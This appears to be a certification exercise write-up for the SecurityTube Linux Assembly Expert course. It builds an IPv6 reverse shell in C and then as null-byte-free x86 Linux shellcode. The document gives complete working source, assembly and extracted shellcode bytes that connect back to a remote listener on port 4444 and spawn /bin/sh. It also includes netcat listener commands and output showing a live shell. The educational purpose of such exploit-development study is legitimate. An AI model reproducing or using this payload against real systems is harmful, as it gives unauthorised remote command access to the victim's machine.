# Note

This MD file has been created for the SecurityTube Linux Assembly Expert certification (https://www.pentesteracademy.com/course?id=3). Student ID: 1483.

All these examples have been tested on real public IPv6 address over the Internet.

# IPv6

Let's try to change the code in order to remotely connect to an IPv6 address:

```C
#include <sys/socket.h>
#include <unistd.h>
#include <netinet/in.h>

int main()
{
	int my_socket = socket(AF_INET6, SOCK_STREAM, 0);

	struct sockaddr_in6 my_sockaddr;
	my_sockaddr.sin6_family = AF_INET6;
	inet_pton(AF_INET6, "xxxx:xxxx:xxxx:xxxx:xxxx:xxxx:xxxx:xxxx", &(my_sockaddr.sin6_addr));
	my_sockaddr.sin6_port = htons(4444);
 	connect(my_socket, (struct sockaddr *)&my_sockaddr, sizeof(my_sockaddr));

	int i;
	for(i = 0; i < 3; i++)
		dup2(my_socket, i);

	execve("/bin/sh", NULL, NULL);
	return 0;
}
```

In a first terminal, we start the listener

```
$ nc -6 -lv 4444
```

In another terminal, let's compile and run the program in order to check it.

```
$ gcc reverse_shell_ipv6.c -o C-reverse6
$ ./C-reverse6 
```
Connection is done in our first terminal

```
$ nc -6 -lv 4444
Connection from 0.0.0.0 port 4444 [tcp/*] accepted
id
uid=1000(cervoise) gid=1000(cervoise) groups=1000(cervoise),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare)
exit
```

# ASM

Changes in the previous code are:
 * using a *sockaddr_in6* structure
 * using AF_INET6
 * using an IPv6 address

Regarding the previous IPv6 shellcode, *sockaddr_in6* structure and AF_INET6 are already known.

The only change will be to push a real IPv6 address. 

# Pushing 2a02:b0c0:1:e0:0:0:6ae:2002

The chosen address is 2a02:b0c0:1:e0:0:0:6ae:2002 (or 2a02:b0c0:1:e0::6ae:2002). This is not the real IPv6 address used for the tests.

It is important because there are null bytes in it. If we do not have to avoid null bytes, this address will be pushed like below:

```ASM
	push 0x0220ae06 ;6ae:2002
  	push 0x00000000 ;0:0
	push 0xe0000100 ; 0001:00e0
	push 0xc0b0022A ; 2a02:b0c0
```

The *push 0x00000000* can be replaced by a *push eax*

As it is not possible to push AL, let's play with registers in order to push *0001:00e0* on the stack:

```ASM
	mov bx, 0xe0e0
	mov bl, al ;al is 0x0
	push bx
  	mov bx, 0x0101
	mov bl, al ;al is 0x0
	push bx
```

## Final shellcode

```ASM
global _start

section .text

_start:
	; socketcall
	xor eax, eax
	mov al, 0x66
	xor ebx, ebx
	mov bl, 1

	xor ecx, ecx
	push ecx
	push ebx
	push 0xa
	mov ecx, esp
	int 0x80

	mov edi, eax

	;connect
	; IPv6: 2a02:b0c0:1:e0:0:0:6ae:2002
  	xor eax, eax
	push 0x0220ae06 ;6ae:2002
  	push eax ;0:0
	; 0001:00e0 -> e0000100
	mov bx, 0xe0e0
	mov bl, al ;al is 0x0
	push bx
  	mov bx, 0x0101
	mov bl, al ;al is 0x0
	push bx
	push 0xc0b0022A ; 2a02:b0c0
	push eax ; sin6_flowinfo
	push word 0x5c11
	push word 0xa
	mov edx, esp
 
	mov al, 0x66
	xor ebx, ebx
	mov bl, 3
	push 0x1c
	push edx
	push edi
	mov ecx, esp

	int 0x80

	;dup2 for loop
	xor ecx, ecx
	mov cl, 2

duploop:
	mov al, 0x3f	
	int 0x80
	dec ecx
	jns duploop	

	;execve
	mov al, 0xb
	xor ecx, ecx
	push ecx
	push 0x68732f6e
	push 0x69622f2f
	mov ebx, esp
	cdq
	int 0x80
```

## Compilation

Lets compile everything:

```
$ bash compile.sh reverse_shellcode_ipv6
[+] Assembling with Nasm ... 
[+] Linking ...
[+] Done!
$ bash get-shellcode.sh reverse_shellcode_ipv6
"\x31\xc0\xb0\x66\x31\xdb\xb3\x01\x31\xc9\x51\x53\x6a\x0a\x89\xe1\xcd\x80\x89\xc7\x31\xc0\x68\x06\xae\x20\x02\x50\x66\xbb\xe0\xe0\x88\xc3\x66\x53\x66\xbb\x01\x01\x88\xc3\x66\x53\x68\x2a\x02\xb0\xc0\x50\x66\x68\x11\x5c\x66\x6a\x0a\x89\xe2\xb0\x66\x31\xdb\xb3\x03\x6a\x1c\x52\x57\x89\xe1\xcd\x80\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x99\xcd\x80"$ gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
```

Then, on the remote server we start the listener:

```
$ nc -6 -l 4444
```

Shellcode is executed:
```
$ ./shellcode 
Shellcode Length:  104
```

And check if everything is working on the remote server:

```
$ nc -6 -l 4444
id
uid=1000(cervoise) gid=1000(cervoise) groups=1000(cervoise),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare)
exit
```

As for the IPv4 shellcode, a Python script could be done in order to automize the port configuration.
